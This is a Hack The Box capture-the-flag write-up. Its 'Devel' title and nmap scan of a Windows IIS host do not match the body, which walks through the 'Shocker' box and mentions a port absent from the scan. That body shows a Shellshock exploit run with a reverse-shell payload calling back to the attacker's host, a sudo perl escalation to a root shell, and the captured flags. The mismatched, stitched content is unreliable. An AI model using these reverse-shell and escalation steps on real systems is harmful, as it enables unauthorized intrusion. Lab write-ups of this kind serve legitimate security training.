# Devel
#### 10.10.10.5

```{r, engine='bash', count_lines}
nmap -sS -sV 10.10.10.5

Nmap scan report for 10.10.10.5
Host is up (0.21s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.56 seconds
```



We visit the website and there is nothing special.
The port 2222 running a ssh looks interesting however OpenSSH 7.2p2 only has a User Enumeration POC

Time to bring out **Dirbuster**

After a scan with a medium wordlist nothing juicy was found.
It had the normal cgi folders and images folders

The name of the box looks suspicious though. Must be a shellshock vuln!

After a little google dorking we find something like this:
![Alt test](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/is_vuln_if.png "Is vuln if")

The first three points look perfect for our system. AND for the last point we need a bash script.
Dirbuster the great can help us search with file extensions
![Alt text](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/dirbuster.png "Dirbuster")

Now we got a presumably vulnerable bash script

**Time to go hunting**

Searchsploiting apache mod cgi gives us 34900.py
![Alt text](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/searchsploit.png "Searchsploit")


The python script won't work out of the box though. We need to add the vulnerable bash script into the the scope.
We add it under the pages array

![Alt text](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Shocker/images/adding_pages.png "Adding Pages")



**And we go exploiting**
```{r, engine='bash', count_lines}
root@kali:~/Hackthebox/Shocker# python 34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.xx lport=1234
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> ifconfig
ens33     Link encap:Ethernet  HWaddr 00:50:56:aa:13:57  
          inet addr:10.10.10.56  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feaa:1357/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feaa:1357/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:12028204 errors:0 dropped:511 overruns:0 frame:0
          TX packets:10213659 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1945868761 (1.9 GB)  TX bytes:2286172156 (2.2 GB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:352786 errors:0 dropped:0 overruns:0 frame:0
          TX packets:352786 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:26113324 (26.1 MB)  TX bytes:26113324 (26.1 MB)
```



We got **_shellz_**

```{r, engine='bash', count_lines}
10.10.10.56> ls /home
heba
shelly

10.10.10.56> cd /home/shelly
10.10.10.56> ls -lah
total 84K
drwxr-xr-x 6 shelly shelly 4.0K Oct  9 04:59 .
drwxr-xr-x 4 root   root   4.0K Oct  9 06:21 ..
-rw------- 1 root   root      0 Sep 25 08:29 .bash_history
-rw-r--r-- 1 shelly shelly  220 Sep 22 12:33 .bash_logout
-rw-r--r-- 1 shelly shelly 3.7K Sep 22 12:33 .bashrc
drwx------ 2 shelly shelly 4.0K Sep 22 12:35 .cache
drwxrwxr-x 2 shelly shelly 4.0K Sep 22 15:49 .nano
-rw-r--r-- 1 shelly shelly  655 Sep 22 12:33 .profile
-rw-r--r-- 1 root   root     66 Sep 22 15:43 .selected_editor
drwx------ 2 shelly shelly 4.0K Oct  8 21:49 .ssh
-rw-r--r-- 1 shelly shelly    0 Sep 22 12:35 .sudo_as_admin_successful
-rwxr-xr-x 1 shelly shelly  14K Oct  8 22:06 doubleput
drwxr-xr-x 2 root   root      0 Dec 31  1969 fuse_mount
-rwxr-xr-x 1 shelly shelly  14K Oct  8 22:05 hello
-rwxr-xr-x 1 shelly shelly 8.5K Oct  8 22:05 suidhelper
-rw-r--r-- 1 root   root     33 Sep 22 15:37 user.txt

10.10.10.56> cat user.txt
2ec24e11320026d1e70ff3e16695b233
```

**Priv Esc**
We check shellys home directory and we see that sudo as admin successful is present
Lets check with sudo -l on what privs shelly actually has
```{r, engine='bash', count_lines}
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
Oh Snap!
Shell has root access for perl. Seems legit  :wink:

So we should technically get root if we spawn a tty using perl
```{r, engine='bash', count_lines}
10.10.10.56> sudo perl -e 'exec "/bin/sh";'
10.10.10.56> id
uid=0(root) gid=0(root) groups=0(root)

10.10.10.56> cd /root
10.10.10.56> ls -lah
total 32K
drwx------  4 root root 4.0K Sep 22 15:36 .
drwxr-xr-x 23 root root 4.0K Sep 22 12:43 ..
-rw-------  1 root root    0 Sep 25 08:23 .bash_history
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  2 root root 4.0K Sep 22 15:36 .cache
drwxr-xr-x  2 root root 4.0K Sep 22 15:33 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root   33 Sep 22 15:36 root.txt
-rw-r--r--  1 root root  170 Sep 22 15:59 .wget-hsts

10.10.10.56> cat root.txt
52c2715605d70c7619030560dc1ca467
```
